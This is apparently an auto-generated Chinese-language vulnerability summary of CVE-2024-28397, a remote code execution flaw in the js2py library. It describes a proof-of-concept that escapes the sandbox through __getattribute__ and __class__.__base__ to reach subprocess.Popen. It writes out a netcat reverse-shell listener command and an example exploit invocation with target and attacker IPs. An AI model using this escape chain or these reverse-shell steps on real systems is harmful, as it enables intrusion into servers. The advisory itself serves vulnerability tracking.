## CVE-2024-28397 - js2py RCE

**漏洞编号:** CVE-2024-28397

**漏洞类型:** RCE

**影响应用:** js2py

**危害等级:** 高危

**CVSS评分:** 未提供，需参考CVE官方信息

**影响版本:** <= v0.74

**利用条件:** 需要网络访问目标服务

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 0%

## 详情

CVE-2024-28397是js2py库中一个远程代码执行漏洞，影响版本<= v0.74。该漏洞源于js2py在处理某些JavaScript代码时，没有充分进行安全检查，导致攻击者可以通过构造恶意的JavaScript代码，在服务器上执行任意命令。根据提供的POC代码，利用该漏洞的步骤如下：

1.  **环境准备**：
    *   安装必要的Python库：`pip install requests`。
    *   准备一个Netcat监听器：`nc -lnvp 4444`（或其他可作为反向shell监听器的工具）。

2.  **漏洞利用**：
    *   使用POC脚本`exploit.py`，指定目标IP地址、端口、目标路径（通常是`/run_code`）、本地监听IP地址和端口。例如：`python3 exploit.py 10.129.66.160 8000 /run_code --local_ip 10.10.15.11 --local_port 4444`。
    *   脚本会构造包含恶意JavaScript代码的POST请求，发送到目标服务器。
    *   恶意代码利用`Object.getOwnPropertyNames`等JavaScript特性，获取`__getattribute__`方法，进而访问`__class__.__base__`，最终寻找并调用`subprocess.Popen`来执行系统命令。
    *   命令执行的结果通过反向shell返回到攻击者的监听器。

**POC有效性分析**：提供的POC代码结构清晰，功能完整。它通过构造特定的JavaScript代码，利用js2py库的漏洞，实现了在目标服务器上执行任意命令的功能。POC代码中使用了`subprocess.Popen`来执行系统命令，并通过`nc`命令建立反向shell连接，将命令执行结果返回给攻击者。该POC的有效性较高，只需要少量配置即可成功利用该漏洞。

**投毒风险分析**：该POC代码的投毒风险较低，因为其主要功能是利用已知的漏洞执行命令，并没有包含任何恶意行为或后门代码。POC代码中使用的库均为标准库，没有引入任何第三方依赖。此外，代码逻辑清晰，易于理解，没有进行任何混淆或隐藏操作。因此，该POC代码的投毒风险较低。

**项目地址:** /tmp/vulnwatchdog_dffc0b283308a502f56f05c964e9c565

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2024-28397
